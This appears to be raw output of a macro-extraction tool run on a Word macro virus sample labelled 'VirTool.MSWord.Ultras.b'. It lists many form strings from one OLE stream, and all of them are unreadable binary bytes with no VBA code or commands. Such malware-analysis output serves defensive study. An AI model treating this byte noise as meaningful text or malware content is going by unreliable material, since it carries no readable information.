VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@M����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EEF���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7E'5@(2;(/6(-3(+/'(+&&(&$%$"#" !!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDE������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@A���������������@@O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&((*--/114������������GGJKKNNNRRRVVVZYY^]]a``ecchffk������������ssxuuzww|xx~yyxx�wx�ww�ww����������������������������������������xx~vv|uu{ssyrrwppunntllrkkpiin���������������������������������LLPIIMFFICCF??B<<?88;447003,,.((*$$%������PPQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@_����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[@@{����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R@@���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@U����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAA���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7F&5A'2;)07)-3(,1(),'(+&%'%$%#!##
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TUU������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBA���������������PPY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##%((*--/114������������FFJJJNNNRRRVUUZYY]\\a__dbbgeej������������rrxttzvv|xx~yyxx�xx�ww�ww����������������������������������������ww}uu{ssyrrwppunntllrjjphhnffk���������������������������������IILFFICCF??B<<?88;557113--/))+%%&  "������MMN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%@@e����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z@@z����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M@@|���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�������������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǿ���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(@@\����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@D���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8F'5@(3=(18)/5(-1)*.(),'&)&%'%#$$!##
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



		
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDD������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##%((*,,/113������������FFIJJMNNQQQUUUYXX]\\`__cbbgeej������������qqwssyuu{ww}xx~yyxx�xx�ww����������������������������������������vv|ttzrrxppvnntllrjjphhmffkddi���������������������������������FFIBBF??B<<?88;558114--0)),%%'!!#dde������KKL


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+@@h����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZPP�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I@@x���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp�������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ο���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2``~����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@AK���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8G(6B(4>)19*/6)-3*+/))-((*&')%%'%#%#"#"!" ���������888
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



GGF������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D������������������12�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
##$'(),-.013������������EFHIIMMMPQQTTTWXX[[[^^^caaeddh������������ppurrxttzvv|xx~yyxxxxxx���������������������������������������uu{ssyqqwootmmrkkpiinffkddibbg���������������������������������BBF??B<<?99<558224..0**,&&(""$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������III
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1@@m������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E@@u���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
տ���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AAS���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9H'7C)4>)2:)07)/4)-1)+/(*,((*&&(&%'%$&#"#"���������VWV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IJH������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9!"V������������������AA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������554
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"#$'()+,.WXY������������EFGIIKLMOPPSTTWWXZZZ^]^``acccg������������pptrrvssxtuyww|xx~xy~xyxx���������������������������������������ttxrrwpptnnrkkpiimggleejbbg``e���������������������������������??C<<?99<668225..1++-'')##%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������GGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6@@q������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A@@r���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܿ����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&AAZ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:I'7D(5?*4=*29*06*.2*,1)+/)*.'(+('*&%'%%'$���������tus
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KLJ������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5ABk������������������ab�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qr����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�AB�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������QQQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#$#'(',,,dee������������ghjHIKLMNOPRSTUVWYYZ]]^_`abbce���������llpnorqquqrvstxuvyww|xx}xy~xy~���������������������������������������rrwppunnsllqjjnhhleeiccg`ac^^b[[`YZ\VVZTTWQQTNNQKKN������������<<?99<679225//1++.((*$$&  !
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CCD���������DDD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<@Au������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=00c��Ϗ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`a쿿�pp�
-------------------------------------------------------------------------------
